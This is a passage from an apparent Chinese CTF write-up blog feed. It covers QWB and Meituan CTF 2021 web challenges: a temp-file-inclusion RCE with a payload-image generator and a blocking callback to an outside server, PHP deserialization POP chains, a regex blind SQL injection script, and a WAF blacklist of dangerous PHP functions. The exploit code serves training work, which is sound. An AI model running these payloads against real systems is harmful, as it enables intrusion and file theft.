class="string">&quot;http://QUESTION_HOST_HERE/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RawDeflate</span>(<span class="params">data, compresslevel=<span class="number">9</span></span>):</span></span><br><span class="line">    compress = zlib.compressobj(</span><br><span class="line">        compresslevel,  <span class="comment"># level: 0-9</span></span><br><span class="line">        zlib.DEFLATED,  <span class="comment"># method: must be DEFLATED</span></span><br><span class="line">        -zlib.MAX_WBITS,  <span class="comment"># window size in bits:</span></span><br><span class="line">        <span class="comment">#   -15..-8: negate, suppress header</span></span><br><span class="line">        <span class="comment">#   8..15: normal</span></span><br><span class="line">        <span class="comment">#   16..30: subtract 16, gzip header</span></span><br><span class="line">        zlib.DEF_MEM_LEVEL,  <span class="comment"># mem level: 1..8/9</span></span><br><span class="line">        <span class="number">0</span>  <span class="comment"># strategy:</span></span><br><span class="line">        <span class="comment">#   0 = Z_DEFAULT_STRATEGY</span></span><br><span class="line">        <span class="comment">#   1 = Z_FILTERED</span></span><br><span class="line">        <span class="comment">#   2 = Z_HUFFMAN_ONLY</span></span><br><span class="line">        <span class="comment">#   3 = Z_RLE</span></span><br><span class="line">        <span class="comment">#   4 = Z_FIXED</span></span><br><span class="line">    )</span><br><span class="line">    deflated = compress.compress(data)</span><br><span class="line">    deflated += compress.flush()</span><br><span class="line">    <span class="keyword">return</span> deflated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RawInflate</span>(<span class="params">data</span>):</span></span><br><span class="line">    decompress = zlib.decompressobj(-zlib.MAX_WBITS)</span><br><span class="line">    inflated = decompress.decompress(data)</span><br><span class="line">    inflated += decompress.flush()</span><br><span class="line">    <span class="keyword">return</span> inflated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate payload</span></span><br><span class="line">payload = (PAYLOAD + <span class="string">&quot;&#123;&#125;&quot;</span>).<span class="built_in">format</span>(<span class="string">&quot; &quot;</span> * <span class="built_in">int</span>(PAYLOAD_LENGTH - (<span class="built_in">len</span>(PAYLOAD)))).encode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Using payload ~&#123;&#125;~&quot;</span>.<span class="built_in">format</span>(payload))</span><br><span class="line">payloadWrapped = codecs.encode(</span><br><span class="line">    RawInflate(RawDeflate(DEFAULT_COMPRESSED_STRING).replace(<span class="string">b&quot;$_GET[0]($_POST[1]);&quot;</span>, payload)), <span class="string">&quot;hex_codec&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Generated wrapped payload &#123;&#125;&quot;</span>.<span class="built_in">format</span>(payloadWrapped))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate image</span></span><br><span class="line">evilImage = <span class="string">&quot;./evilImage.png&quot;</span></span><br><span class="line">filterProof = bypass_filters(payloadWrapped)</span><br><span class="line">save_image(filterProof, evilImage)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Generated Image &#123;&#125;&quot;</span>.<span class="built_in">format</span>(evilImage))</span><br><span class="line">verify(evilImage, payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Fin&quot;</span>)</span><br></pre></td></tr></table></figure><p>此时整个包含临时文件 RCE 的路径就完整了，但是临时文件要想办法留存更久。因此考虑使用 <code>file_get_contents($this-&gt;qwb);</code> 来阻塞进程，即在自己的服务器上给出如下代码，使得程序的请求强制停留等待，即给临时文件包含提供了时间。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    sleep(<span class="number">2147483647</span>);</span><br></pre></td></tr></table></figure><p>写出如下载荷来达成阻塞的目的，同时以 POST 的方式将生成的恶意文件上传。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// trigger the include of myclass.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$triggerHello</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;triggerHello = <span class="keyword">new</span> Hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwb</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;qwb = <span class="string">&quot;http://8.136.8.210:3255&quot;</span>; <span class="comment">// force sleep 2147483647</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> substr(urlencode(serialize(<span class="keyword">new</span> myclass())), <span class="number">0</span>, -<span class="number">6</span>);</span><br></pre></td></tr></table></figure><p>上传文件后使用 <code>e2a7106f1cc8bb1e1318df70aa0a3540.php</code> 列出 <code>/tmp</code> 下的文件，再发送请求将其包含后执行指令。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623633738014/988c7ff307e04bdbc84a0cb0bd53610d521b78ab.png" alt="image-20210614092215747"></p><p>在 <code>/l1b</code> 下可以找到疑似 flag 的文件，但是无法读出，猜测需要一个 readflag，可以找到有 <code>/usr/bin/ed471efd0577be6357bb94d6R3@dF1aG</code> 文件，将其作 readflag 使用，构造 <code>/usr/bin/ed471efd0577be6357bb94d6R3@dF1aG /l1b/06cb199b/1ea50a20/8d8880fa/eaf8f8a5/c7769282/Fl444gggb08c9817</code> 即可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e9f76b6f-46c5-477e-b7ec-f5f03df1f74a&#125;</span><br></pre></td></tr></table></figure><h3 id="强网先锋-赌徒"><a href="#强网先锋-赌徒" class="headerlink" title="[强网先锋]赌徒"></a>[强网先锋]赌徒</h3><p><a href="http://www.zip/">www.zip</a> 有源码泄露，可以得到如下源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sayhello();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;Get_hint(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hi</span> = <span class="keyword">new</span>  Start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造如下脚本生成序列化字符串载荷。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> Info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>] = <span class="keyword">new</span> Room();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;a = <span class="keyword">new</span> Room();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Start());</span><br></pre></td></tr></table></figure><p>将得到的载荷以 GET 参数 hello 发送请求即可得到如下字符串。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3s3MzcxOGIzMy03OWRlLTQyZmMtOWZkMi02MmEyZGE1NjJlMWN9</span><br></pre></td></tr></table></figure><p>将其 Base64 解码一次即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;73718b33-79de-42fc-9fd2-62a2da562e1c&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/1ff2873c.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>美团 CTF 2021</title>
      <link>https://lemonprefect.cn/zh-CN/posts/f43e78a1.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/f43e78a1.html</guid>
      <pubDate>Fri, 28 May 2021 07:07:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h3 id=&quot;sql&quot;&gt;&lt;a href=&quot;#sql&quot; class=&quot;headerlink&quot; title=&quot;sql&quot;&gt;&lt;/a&gt;sql&lt;/h3&gt;&lt;p&gt;简单的正则盲注，将找到的脚本简单修改即可跑出密码。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h3 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h3><p>简单的正则盲注，将找到的脚本简单修改即可跑出密码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_hex</span>(<span class="params">litter</span>):</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> litter:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x5e&#x27;</span> + <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string = string.ascii_lowercase + string.ascii_uppercase + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br><span class="line">        url = <span class="string">&#x27;.../index.php&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;null\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;||(`password`/**/regexp/**/binary/**/&#123;&#125;)#&#x27;</span>.<span class="built_in">format</span>(str_hex(flag + j))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>运行脚本可以得出密码为 <code>This_1s_thE_Passw0rd</code>，使用用户名 <code>admin</code> 配合登录即可获得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;afccfbe8-a333-4eed-86ca-1b1967ffb0ae&#125;</span><br></pre></td></tr></table></figure><h3 id="easytricks"><a href="#easytricks" class="headerlink" title="easytricks"></a>easytricks</h3><p>发现有 <code>/admin</code> 路由，同时可以找到部分原题。</p><blockquote><p><a href="https://blog.csdn.net/SopRomeo/article/details/105849403">https://blog.csdn.net/SopRomeo/article/details/105849403</a></p></blockquote><p>使用 admin 作为用户名，密码 <code>GoODLUcKcTFer202OHAckFuN</code> 即可成功登录上去。登录之后可以找到如下提示。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &#x2F;admin&#x2F;admin.rar --&gt;</span><br></pre></td></tr></table></figure><p>将源码下载下来，可以在 preload.php 下发现如下关键的源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_save_path(<span class="string">&#x27;session&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">preload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="string">&quot;&lt;?php class hacker&#123;public function hack()&#123;echo &#x27;hack the hack!I believe you can!&#x27;;&#125;&#125;\$hack=&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents=<span class="string">&quot;new hacker();phpinfo();&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="string">&quot;\$hack-&gt;hack();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$parm</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$blacklist</span>=<span class="string">&quot;/flag|pcntl|system|exec|fread|file|fpassthru|popen|proc|ld|putenv|passthru|`|\.|\\\|#|\\$|[0-9]|_|get|~|\\^|eval|assert|open|write|include|require/is&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="variable">$blacklist</span>,<span class="variable">$parm</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;waf(<span class="keyword">$this</span>-&gt;contents)||strlen(<span class="keyword">$this</span>-&gt;contents)&gt;<span class="number">60</span>||preg_match_all(<span class="string">&#x27;/\\(/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,<span class="variable">$matches</span>)&gt;<span class="number">2</span>||preg_match_all(<span class="string">&#x27;/\\)/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,<span class="variable">$matches</span>)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match_all(<span class="string">&#x27;/;/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,<span class="variable">$matches</span>)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;try hard&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>))&#123;</span><br><span class="line">            unlink(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;class);</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;contents,FILE_APPEND);</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;method,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="string">&quot;&lt;?php class hacker&#123;public function hack()&#123;echo &#x27;hack the hack!I believe you can!&#x27;;&#125;&#125;\$hack=&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="string">&quot;\$hack-&gt;hack();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">var_dump(unserialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$preload</span>=<span class="keyword">new</span> preload();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">&quot;./hack.php&quot;</span>&gt;hack.php&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;./cli.php&quot;</span>&gt;cli.php&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>可以发现存在反序列化的可控制点。只需要将内容拼接在 <code>$this-&gt;contents</code> 中即可写入到 hack.php 中，但是马上就会被 <code>$preload=new preload();</code> 重新覆盖掉，因此考虑条件竞争。构造出如下脚本生成反序列化载荷。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">preload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$method</span>;</span><br><span class="line"></span><br><span class="line">    <span 